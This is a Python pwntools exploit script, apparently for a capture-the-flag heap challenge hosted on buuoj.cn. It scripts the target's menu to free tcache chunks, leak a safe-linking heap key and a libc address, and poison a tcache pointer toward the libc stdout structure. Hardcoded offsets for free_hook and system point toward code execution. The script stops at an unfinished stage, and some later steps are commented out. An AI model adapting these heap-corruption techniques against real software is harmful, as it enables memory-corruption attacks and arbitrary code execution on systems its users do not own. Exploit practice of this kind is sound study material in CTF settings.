#!/usr/bin/python3
#-*- coding: utf-8 -*-
from pwn import *

context.log_level = 'debug'
context.arch='amd64'
context.terminal = ['tmux','sp','-h','-l','120']

remote_service = "node4.buuoj.cn:28394"
remote_service = remote_service.strip().split(":")
# p = remote(remote_service[0], int(remote_service[1]))
filename = "./pwn"
p = process(filename)

e = ELF(filename, checksec=False)
l = ELF(e.libc.path, checksec=False)
# l = ELF("./libc6_2.32-0ubuntu6_amd64.so", checksec=False)

rl = lambda a=False : p.recvline(a)
ru = lambda a,b=True : p.recvuntil(a,b)
rn = lambda x : p.recvn(x)
sn = lambda x : p.send(x)
sl = lambda x : p.sendline(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
irt = lambda : p.interactive()
dbg = lambda text=None : gdb.attach(p, text)
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
def debugPID():
	lg("p.pid")
	input()
	pass

def new(sz, data):
	ru(b': ')
	sl(b'1')
	ru(b'Please tell me its size: \n')
	sl(str(sz).encode())
	ru(b'Content: ')
	sn(data)
def edit(idx, data):
	ru(b': ')
	sl(b'2')
	ru(b'Please tell me the index: \n')
	sl(str(idx).encode())
	ru(b'Please tell me its content: \n')
	sn(data)
def free(idx):
	ru(b': ')
	sl(b'3')
	ru(b'Please tell me the index: \n')
	sl(str(idx).encode())
def show(idx):
	ru(b': ')
	sl(b'4')
	ru(b'Please tell me the index: \n')
	sl(str(idx).encode())

# main_arena_of = 0x1ecb80
# main_arena_of = 0x1e3ba0
# free_hook_of  = 0x1e6e40
# system_offset = 0x503c0
main_arena_of = 0x1b3ba0 + 0x2f000
free_hook_of  = 0x1e5e40
system_offset = 0x501e0

stdout_of = 0x6c0

for i in range(9):
	new(128, b'a')
# debugPID()
for i in range(8):
	free(i)

show(0)
heap_xor  = uu64(rn(6))
heap_base = heap_xor << 0xc
lg("heap_base")

# debugPID()

show(7)
leak_addr = uu64(rn(6))
lg("leak_addr")
lg("(leak_addr & 0xffffffff0000) + (0x7<<0xc) + stdout_of")

edit(6, p64(((leak_addr & 0xfffffffff000) + (0x1<<0xc) + stdout_of)^heap_xor) + b'\n')
# edit(6, p64(((leak_addr & 0xffffffff0000) + (0x7<<0xc) + stdout_of)^heap_xor) + b'\n')
debugPID()

# new(128, b'aaa') # 9
# new(128, p64(0xfbad1887) + p64(0)*3 + p8(0x58) + b'\n')

irt()